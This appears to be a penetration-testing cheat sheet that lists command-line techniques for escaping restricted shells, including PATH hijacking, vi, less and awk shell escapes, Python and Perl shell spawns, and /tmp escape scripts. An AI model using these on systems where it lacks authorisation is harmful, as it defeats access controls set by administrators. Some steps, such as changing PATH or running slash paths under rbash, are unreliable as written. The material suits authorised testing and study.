# Escaping Restricted Shells

**Restricted shells** (rbash, rksh, rzsh) limit user capabilities to restrict command execution, script access, and system navigation. These are often implemented for security in shared environments.

### Common Techniques to Escape

### 1. **Command Substitution**

```bash
ls -l `whoami`
```

Executes allowed command via backticks or `$(command)`.

### 2. **Command Chaining**

```bash
ls; whoami; id
```

Executes multiple commands if separators like `;`, `&&`, or `||` are allowed.

### 3. **Command Injection**

Inject commands where user input is executed by the shell.

Example:

```bash
command `id`
```

### 4. **PATH Hijacking**

Override the PATH variable to run your own scripts in place of allowed commands.

```bash
mkdir /tmp/bin
echo "/bin/bash" > /tmp/bin/ls
chmod +x /tmp/bin/ls
export PATH=/tmp/bin:$PATH
ls
```

### 5. **Using Interactive Programs**

Escape via built-in programs like:

```bash
vi → :!bash
less → !bash
awk → awk 'BEGIN {system("/bin/bash")}'
```

### 6. **Scripting Languages**

Spawn a new unrestricted shell using:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
```

### 7. **Script Files**

Create executable script to escape:

```bash
echo "/bin/bash" > /tmp/escape.sh
chmod +x /tmp/escape.sh
/tmp/escape.sh
```

***
